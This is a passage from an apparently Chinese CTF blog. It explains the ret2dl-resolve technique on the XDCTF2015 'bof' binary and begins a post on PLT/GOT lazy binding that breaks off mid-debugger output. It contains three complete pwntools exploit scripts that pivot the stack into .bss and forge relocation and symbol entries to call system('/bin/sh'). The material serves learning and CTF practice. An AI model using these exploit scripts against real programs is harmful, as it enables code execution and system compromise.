class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(base_stage) </span><br><span class="line">payload += p32(read_plt)  </span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)  </span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage+<span class="number">4</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">index_offset = <span class="number">0x20</span> <span class="comment"># write's index</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>这里有个坑两次payload不能发送太快，需要sleep或者pause一下，否则会当作一次输入</p></blockquote><p>一直运行直到ESP被修改为假栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────</span><br><span class="line"> EAX  <span class="number">0x64</span></span><br><span class="line"> EBX  <span class="number">0x0</span></span><br><span class="line"> ECX  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"> EDX  <span class="number">0x64</span></span><br><span class="line"> EDI  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"> ESI  <span class="number">0x0</span></span><br><span class="line"> EBP  <span class="number">0x8048380</span> ◂— push   dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line"> ESP  <span class="number">0x804a848</span> ◂— <span class="number">0x20</span> <span class="comment">/* ' ' */</span></span><br><span class="line"> EIP  <span class="number">0x8048459</span> (deregister_tm_clones+<span class="number">41</span>) ◂— ret    </span><br><span class="line">───────────────────────────────────────────[ DISASM ]────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x804861b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;         pop    ebp</span><br><span class="line">   <span class="number">0x804861c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x804861b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;         pop    ebp</span><br><span class="line">   <span class="number">0x804861c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8048458</span> &lt;deregister_tm_clones+<span class="number">40</span>&gt;    leave  </span><br><span class="line"> ► <span class="number">0x8048459</span> &lt;deregister_tm_clones+<span class="number">41</span>&gt;    ret    &lt;<span class="number">32</span>&gt;</span><br></pre></td></tr></table></figure><p> 这个时候已经在fake stack上布置好了ROP链</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x804a840</span></span><br><span class="line">00:0000│ ecx edi  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│          <span class="number">0x804a844</span> —▸ <span class="number">0x8048380</span> ◂— push   dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│ esp      <span class="number">0x804a848</span> ◂— <span class="number">0x20</span> <span class="comment">/* ' ' */</span></span><br><span class="line">03:000c│          0x804a84c ◂— 0x41414141 ('AAAA')</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│          <span class="number">0x804a850</span> ◂— <span class="number">0x1</span></span><br><span class="line">05:0014│          0x804a854 —▸ 0x804a890 ◂— '/bin/sh'</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│          <span class="number">0x804a858</span> ◂— <span class="number">0x7</span></span><br><span class="line">07:001c│          0x804a85c ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh'</span><br></pre></td></tr></table></figure><p>接下来部署真实的ROP链，再复习一下 _dl_runtime_resolve的过程</p><ol><li>用<strong>link_map</strong>访问.<strong>dynamic</strong>，取出.<strong>dynstr</strong>, .<strong>dynsym</strong>, <strong>.rel.plt</strong>的指针</li><li><strong>.rel.plt + 第二个参数</strong>求出当前函数的重定位表项<strong>Elf32_Rel</strong>的指针，记作<strong>rel</strong></li><li><strong>rel-&gt;r_info &gt;&gt; 8</strong>作为.<strong>dynsym</strong>的下标，求出当前函数的符号表项<strong>Elf32_Sym</strong>的指针，记作<strong>sym</strong></li><li><strong>.dynstr + sym-&gt;st_name</strong>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<strong>*rel-&gt;r_offset</strong>，即<strong>GOT</strong>表</li><li>调用这个函数 </li></ol><p><strong>_dl_runtime_resolve</strong>在第二步时</p><blockquote><p><strong>.rel.plt</strong> + 第二个参数求出当前函数的重定位表项<strong>Elf32_Rel</strong>的指针，记作<strong>rel</strong></p></blockquote><p>这个时候，<strong>_dl_runtime_resolve</strong>并没有检查<strong>.rel.plt</strong> + 第二个参数后是否造成越界访问，所以我们能给一个很大的<strong>.rel.plt</strong>的<strong>offset</strong>（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<strong>.bss</strong></p><p>然后第三步</p><blockquote><p><strong>rel-&gt;r_info &gt;&gt; 8</strong>作为<strong>.dynsym</strong>的下标，求出当前函数的符号表项<strong>Elf32_Sym</strong>的指针，记作<strong>sym</strong></p></blockquote><p>所以在我们所伪造的<strong>Elf32_Rel</strong>，需要放一个<strong>r_info</strong>字段，大概长这样就行<strong>0xXXXXXX07</strong>，其中<strong>XXXXXX</strong>是相对<strong>.dynsym</strong>表的下标，注意不是偏移，所以是偏移除以<strong>Elf32_Sym</strong>的大小，即除以<strong>0x10</strong>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<strong>Elf32_Sym</strong>。至于为什么是<strong>07</strong>，因为这是一个导入函数，而导入函数一般都是<strong>07</strong>，所以写成<strong>07</strong>就好</p><p>然后第四步</p><blockquote><p><strong>.dynstr + sym-&gt;st_ame</strong>得出符号名字符串指针</p></blockquote><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image003.jpg" alt="img"></p><ul><li><p>我们可以控制<strong>index_offset</strong>所以指向这个<strong>fake_stack</strong>上的一个位置即为我们布置的<strong>fake_reloc</strong></p><ul><li><p>需要通过计算得到<strong>index_offset</strong> 的值， 计算公式为：我们布置的<strong>fake_reloc</strong> 的地址 - <strong>rel.plt</strong> 的真实地址</p></li><li><p><strong>fake_reloc</strong>的结构，<strong>r_offset</strong>是函数 的 .<strong>got.plt</strong> 的地址 </p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;</span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>让我们要做的是让<strong>fake_reloc</strong> 的<strong>r_info</strong> 指向 <strong>fake_sym</strong> 结构体</p><ul><li><p>计算方法为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">align = <span class="number">0x10</span>-(( fake_sym_addr - .dynsym ) &amp;<span class="number">7</span> );</span><br><span class="line">fake_sym_addr = fake_sym_addr + align ;</span><br><span class="line">index_dynsym = (fake_sym_addr - .dynsym )/<span class="number">0x10</span>;</span><br><span class="line">r_info = (index_dysym&lt;&lt;<span class="number">8</span>) | <span class="number">0x7</span>    <span class="comment">//保证这最后一字节为 0x07</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>劫持程序到<strong>fake_sym</strong>之后我们要做的就是让<strong>fake_sym</strong>指向我们定义的 <strong>.dynstr</strong> 中的对应函数字符串。一般<strong>fake_sym</strong>我们构造的结构为<strong>fake_sym = p32(st_name) + p32(0) + p32(0) +  p32(0x12)</strong>  ，<strong>st_name</strong>就是我们保存我字符串的地址</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment">//0x10 刚好为fake_sym的大小刚好让 函数字符串 保存在这个位置。</span></span><br></pre></td></tr></table></figure></li><li><p>让这个字符串为我们需要的如：<strong>system</strong> 那我们之后就能调用<strong>write</strong>从而调用<strong>system</strong> </p></li></ul><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720191015221035.png" alt></p><p>最终的Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment">#readelf -S</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">fake_dynstr = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = p32(fake_dynstr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc</span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym</span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>还有一种使用ROP模块写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment">## write sh="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">### making fake write symbol</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span></span><br><span class="line">                )  <span class="comment"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (</span><br><span class="line">    fake_sym_addr - dynsym) / <span class="number">0x10</span>  <span class="comment"># calculate the dynsym index of write</span></span><br><span class="line"><span class="comment">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_write_sym = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">### making fake write relocation</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_write_reloc = flat([write_got, r_info])</span><br><span class="line"></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line"><span class="comment">## fake ret addr of write</span></span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(fake_write_reloc)  <span class="comment"># fake write reloc</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * align)  <span class="comment"># padding</span></span><br><span class="line">rop.raw(fake_write_sym)  <span class="comment"># fake write symbol</span></span><br><span class="line">rop.raw(<span class="string">'write\x00'</span>)  <span class="comment"># there must be a \x00 to mark the end of string</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line"></span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>延迟绑定小谈</title>
      <link href="/2019/10/14/%E2%95%A4%E2%95%99%E2%94%82%E2%94%98%E2%96%91%E2%89%A4%E2%95%A2%C2%BF%E2%95%A8%C3%AD%E2%95%A0%E2%95%95/"/>
      <url>/2019/10/14/%E2%95%A4%E2%95%99%E2%94%82%E2%94%98%E2%96%91%E2%89%A4%E2%95%A2%C2%BF%E2%95%A8%C3%AD%E2%95%A0%E2%95%95/</url>
      
        <content type="html"><![CDATA[<h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy  binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Pwn\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，这个<strong>puts</strong>是调用的<strong>libc</strong>这个动态链接库导出的一个函数。编译它，看看<strong>puts</strong>是怎么被调用的 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">080482E0</span> ; <span class="function"><span class="keyword">int</span> <span class="title">puts</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span></span><br><span class="line">.plt:080482E0 _puts           proc near               ; CODE XREF: main+19↓p</span><br><span class="line">.plt:<span class="number">080482E0</span></span><br><span class="line">.plt:<span class="number">080482E0</span> s               = dword ptr  <span class="number">4</span></span><br><span class="line">.plt:<span class="number">080482E0</span></span><br><span class="line">.plt:<span class="number">080482E0</span>                 jmp     ds:off_804A00Cc</span><br><span class="line">.plt:<span class="number">080482E0</span> _puts           endp</span><br><span class="line">.plt:<span class="number">080482E0</span></span><br></pre></td></tr></table></figure><p> <strong>puts</strong>会<strong>call</strong>到<strong>off_804A00Cc</strong>这里，这里就是“<strong>jmp</strong> [<strong>GOT</strong>表地址]”的这样一条指令， 跟一下，看看这个<strong>off_804A00C</strong>在第一次调用时是什么东西 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint *<span class="number">0x08048424</span></span><br><span class="line">pwndbg&gt; si</span><br><span class="line"><span class="number">0x080482e0</span> in <span class="built_in">puts</span>@plt ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0xf7fb4dbc (environ) —▸ 0xffffd10c —▸ 0xffffd2ff ◂— 'XDG_VTNR=7'</span><br><span class="line"> EBX  <span class="number">0x0</span></span><br><span class="line"> ECX  <span class="number">0xffffd070</span> ◂— <span class="number">0x1</span></span><br><span class="line"> EDX  <span class="number">0xffffd094</span> ◂— <span class="number">0x0</span></span><br><span class="line"> EDI  <span class="number">0xf7fb3000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line"> ESI  <span class="number">0xf7fb3000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line"> EBP  <span class="number">0xffffd058</span> ◂— <span class="number">0x0</span></span><br><span class="line"> ESP  <span class="number">0xffffd03c</span> —▸ <span class="number">0x8048429</span> ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"> EIP  <span class="number">0x80482e0</span> (<span class="built_in">puts</span>@plt) ◂— jmp    dword ptr [<span class="number">0x804a00c</span>]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x80482e0</span>  &lt;<span class="built_in">puts</span>@plt&gt;                  jmp    dword ptr [<span class="number">0x804a00c</span>]</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x80482e6</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line">   <span class="number">0x80482eb</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x80482d0</span></span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x80482d0</span>                              push   dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line">   <span class="number">0x80482d6</span>                              jmp    dword ptr [<span class="number">0x804a008</span>] &lt;<span class="number">0xf7fee000</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">   <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   